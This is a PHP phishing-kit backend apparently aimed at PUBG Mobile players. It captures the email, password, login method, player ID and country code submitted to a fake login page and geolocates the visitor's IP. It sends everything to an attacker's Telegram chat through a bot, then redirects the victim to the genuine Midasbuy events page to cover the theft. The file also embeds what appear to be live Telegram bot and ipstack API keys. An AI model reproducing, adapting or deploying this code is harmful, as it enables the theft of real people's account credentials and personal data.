<?php
ob_start();
$API_KEY = '1998073200:AAGxMIV6HxJ5tUWAmLjig5UwYP98Pqhewus';
define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
    $tbbots = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$tbbots";
        $ttktt = file_get_contents($url);
        return json_decode($ttktt);
}
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
date_default_timezone_set('Asia/Baghdad');
$time = date('h:i');
$year = date('Y');
$month = date('n');
$day = date('j');
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$name = $message->from->first_name;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$user = $message->from->username;

$admin = "831161538";
$email = $_GET["email"];
$password = $_GET["password"];
$login = $_GET["login"];
$playid = $_GET['playid'];
$callingcode = $_GET['country_code'];
$linky = $_SERVER['HTTP_HOST'];

if($email){
$api_key = "26dc150b1cf3c41dc866400812300e6d";
$cty1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
$jsondata = json_decode($cty1);
$cty = $jsondata->country_name;
$code = $jsondata->calling_code;
$url1 = "https://www.midasbuy.com/events/register/pubgm?lan=en&v=4&from=__mds_buy_banner.events";
header("location: $url1");
$name = $message->from->first_name;
bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"

╭────•𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙰 𝙽𝙴𝚆 𝙰𝙲𝙲𝙾𝚄𝙽𝚃•────╮
   ➥ 𝙻𝙾𝙶𝙸𝙽 𝙱𝚈  »  $login
   💻 • 𝚒𝙿 » $ip
   📧 • 𝙴𝚖𝚊𝚒𝚕 »  `$email`
   📟 • 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » `$password`
   💎 • 𝙿𝚕𝚊𝚢𝚎𝚛 𝙸𝙳 » $playid
   🏴 • 𝙲𝚘𝚞𝚗𝚝𝚛𝚢 » $cty
   ☎️ • 𝙲𝚘𝚍𝚎 » $callingcode
   ⏲️ • 𝚃𝚒𝚖𝚎 » $time
   📝 • 𝙳𝚊𝚝𝚎 » $day/$month/$year
╰───────•𝙳𝙴𝚅 𝙱𝚈 @PHP505•───────╯
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
}
?>
<html>
  <head>
    <meta http-equiv="refresh" content="0; url='/index.php'" />
    <script type="text/javascript">
            window.location.href = "/index.php"
    </script>
 </head>
  <body>
  </body>
</html>
<?
?>
